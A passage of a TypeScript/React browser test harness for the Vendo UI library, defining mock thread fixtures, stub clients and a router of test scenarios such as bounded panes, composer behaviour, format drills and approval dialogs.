    { id: "heading", component: "Text", props: { text: "Stored v0 invoice", variant: "heading" } },
    { id: "amount", component: "Text", props: { text: { $path: "/invoice/total" } } },
  ],
};

function FormatDrillScenario({ registered }: { registered: boolean }) {
  const noop = async (): Promise<ToolOutcome> => ({ status: "ok", output: null });
  // Registration is a real-browser side effect on the module-level registry;
  // each page load is a fresh module, so `registered` fully controls the seam.
  if (registered) registerTreeRenderer(DRILL_FORMAT, DrillRenderer);
  return (
    <div className="format-drill-grid">
      <section aria-label="Drill payload">
        <h2>Drill format payload</h2>
        <PayloadView payload={drillPayload} components={components} onAction={noop} />
      </section>
      <section aria-label="Stored v0 tree">
        <h2>Stored v0 record</h2>
        <PayloadView payload={storedV1Tree as unknown as UIPayload} components={components} onAction={noop} />
      </section>
      <p>Host content after the drill surfaces survived.</p>
    </div>
  );
}

/** A second long conversation for the thread-SWITCH scenario (ENG-213): both
 *  ids ride the wire list() via the client override below. */
const boundedThreadB: Thread = {
  ...boundedThread,
  id: "thr_1b",
  messages: boundedThread.messages.slice(0, -1).map(message => ({
    ...message,
    id: `${message.id}_b`,
  })),
};

/** Serves BOTH bounded fixtures: get() by id and a list() that includes them,
 *  so useVendoThread adopts either when the scenario switches threads. */
function boundedThreadsClient(client: VendoClient): VendoClient {
  const fixtures = new Map([[boundedThread.id, boundedThread], [boundedThreadB.id, boundedThreadB]]);
  return {
    ...client,
    threads: {
      ...client.threads,
      get: async id => fixtures.get(id) ?? client.threads.get(id),
      list: async () => [...fixtures.values()].map(thread => ({
        id: thread.id,
        title: "Bounded fixture thread",
        updatedAt: thread.updatedAt,
      })),
    },
  };
}

/** ENG-212: the Cadence /assistant host shape — a bounded, overflow-hidden flex
 *  pane owning the height. The root must forward that height so .fl-msglist is
 *  the scroll container and the composer + approval actions stay reachable.
 *  The switch button drives the ENG-213 thread-change reset: the new thread
 *  must open at its latest turn even after a scroll-up in the previous one. */
function BoundedThreadScenario() {
  const [activeThread, setActiveThread] = useState(boundedThread.id);
  return (
    <VendoProvider client={boundedThreadsClient(baseClient)} components={components}>
      <button
        type="button"
        data-testid="switch-thread"
        onClick={() => setActiveThread(current => current === boundedThread.id ? boundedThreadB.id : boundedThread.id)}
      >
        Switch conversation
      </button>
      <div
        data-testid="bounded-pane"
        style={{ height: 560, display: "flex", flexDirection: "column", overflow: "hidden",
          border: "1px solid #cad3e0", borderRadius: 12 }}
      >
        <VendoThread threadId={activeThread} />
      </div>
    </VendoProvider>
  );
}

/** ENG-215 — a clean two-turn thread (no tools/approvals) so the composer's
 *  edit-last / regenerate / autogrow / queued-send behaviors read without the
 *  approval clutter of the canned wire turn. */
const composerThread: Thread = {
  id: "thr_composer",
  subject: "browser-user",
  createdAt: NOW,
  updatedAt: NOW,
  messages: [
    {
      id: "cmp_u1",
      role: "user",
      parts: [{ type: "text", text: "Draft a friendly welcome email for new Maple customers." }],
    },
    {
      id: "cmp_a1",
      role: "assistant",
      parts: [{
        type: "text",
        text: "Here's a warm welcome email you can send to new Maple customers. It opens with a "
          + "greeting, points them at their first three actions, and closes with a human sign-off "
          + "so it never reads like an autoresponder.",
      }],
    },
  ],
};

/** Serves the clean composer thread by id and in list() so useVendoThread adopts it. */
function composerThreadClient(client: VendoClient): VendoClient {
  return {
    ...client,
    threads: {
      ...client.threads,
      get: async id => id === composerThread.id ? composerThread : client.threads.get(id),
      list: async () => [{ id: composerThread.id, title: "Welcome email", updatedAt: composerThread.updatedAt }],
    },
  };
}

function ComposerScenario({ theme }: { theme: Partial<VendoTheme> }) {
  return (
    <VendoProvider client={composerThreadClient(baseClient)} components={components} theme={theme}>
      <div style={{ height: 560, display: "flex", flexDirection: "column", overflow: "hidden",
        border: "1px solid var(--vendo-border)", borderRadius: 12 }}>
        <VendoThread threadId="thr_composer" />
      </div>
    </VendoProvider>
  );
}

/** ENG-216 — the humanization showcase, in a Maple-brand host with host tool
 *  metadata supplied via the VendoProvider `tools` seam. */
function HumanizedThreadScenario() {
  return (
    <VendoProvider
      client={threadClient(baseClient, humanizedThread)}
      components={components}
      theme={mapleTheme}
      tools={humanizedTools}
    >
      <VendoThread threadId="thr_humanized" />
    </VendoProvider>
  );
}

function scenario(pathname: string): { title: string; theme?: Partial<VendoTheme>; content: ReactNode; ownProvider?: boolean } {
  switch (pathname) {
    case "/thread": return { title: "Thread — dark theme", theme: darkTheme, content: <VendoThread threadId="thr_1" /> };
    case "/composer": return { title: "Composer (Maple)", content: <ComposerScenario theme={mapleTheme} />, ownProvider: true };
    case "/composer-dark": return { title: "Composer — dark", content: <ComposerScenario theme={darkTheme} />, ownProvider: true };
    case "/thread-bounded": return { title: "Thread — bounded host pane", content: <BoundedThreadScenario />, ownProvider: true };
    case "/thread-landing": return { title: "Landing (Maple host)", content: <LandingScenario />, ownProvider: true };
    case "/thread-humanized": return { title: "Thread — humanized (host metadata)", content: <HumanizedThreadScenario />, ownProvider: true };
    case "/overlay": return { title: "Overlay", content: <AutoOpen selector='button[aria-controls="vendo-overlay-dialog"]'><VendoOverlay /></AutoOpen> };
    case "/page": return { title: "Workspace — Apps tab", content: <AutoOpen selector='[role="tab"][aria-controls="vendo-panel-apps"]'><VendoPage /></AutoOpen> };
    case "/palette": return { title: "Command palette", content: <OpenPalette /> };
    case "/approval": return { title: "Destructive approval", content: <ApprovalScenario /> };
    case "/activity": return { title: "Activity", content: <ActivityPanel /> };
    case "/automations": return { title: "Automations", content: <AutomationsPanel /> };
    case "/notice": return { title: "Unconfigured policy", ownProvider: true, content: (<VendoProvider client={unconfiguredClient} components={components}><NoPolicyNotice /></VendoProvider>) };
    case "/stage": return { title: "Voice stage", content: <StageScenario />, ownProvider: true };
    case "/stage-live": return { title: "Voice stage (live)", content: <LiveStageScenario />, ownProvider: true };
    case "/tree": return { title: "Tree containment", content: <TreeScenario /> };
    case "/tree-jail": return { title: "Generated component jail", content: <TreeScenario jail /> };
    case "/tree-inclient": return { title: "In-client venue (hash-pinned approval)", content: <InClientScenario /> };
    case "/tree-drift": return { title: "Pin drift (host component updated)", content: <PinDriftScenario /> };
    case "/tree-themed": return { title: "Tree — loud host theme", theme: loudTheme, content: <TreeScenario /> };
    case "/tree-stream": return { title: "Streaming completion", content: <StreamCompletionScenario /> };
    case "/unknown-format": return { title: "Unknown UI format", content: <UnknownFormatScenario />, ownProvider: true };
    case "/format-drill-registered": return { title: "Format drill — registered", content: <FormatDrillScenario registered />, ownProvider: true };
    case "/format-drill-unregistered": return { title: "Format drill — unregistered", content: <FormatDrillScenario registered={false} />, ownProvider: true };
    case "/slot": return { title: "Inline app slot", content: <VendoSlot id="hero" appId="app_1"><section aria-label="Original host component"><h2>Original host hero</h2></section></VendoSlot> };
    case "/slot-fallback": return { title: "Slot pin fallback", content: <SlotFallbackScenario />, ownProvider: true };
    case "/appframe": return { title: "App execution planes", content: <AppFrameScenario /> };
    default: return { title: "Unknown scenario", content: <p role="alert">Unknown browser scenario: {pathname}</p> };
  }
}

function Harness() {
  const current = scenario(globalThis.location.pathname);
  const content = current.ownProvider
    ? current.content
    : (
      <VendoProvider
        client={globalThis.location.pathname === "/thread" ? threadClient(baseClient, pendingThread) : baseClient}
        components={components}
        theme={current.theme}
      >
        {current.content}
      </VendoProvider>
    );
  // Full-bleed host-frame scenarios (the Maple frame IS the host chrome) render
  // edge-to-edge, not as a card on the harness canvas.
  if (globalThis.location.pathname === "/thread-landing") {
    return <div data-scenario="thread-landing" style={{ position: "fixed", inset: 0 }}>{content}</div>;
  }
  return (
    <main className={`harness-shell${globalThis.location.pathname === "/thread" ? " harness-dark" : ""}`} data-scenario={globalThis.location.pathname.slice(1)}>
      <h1 className="harness-heading">{current.title}</h1>
      <div className="harness-surface">{content}</div>
    </main>
  );
}

const root = document.getElementById("root");
if (!root) throw new Error("Browser harness root is missing.");
createRoot(root).render(<Harness />);
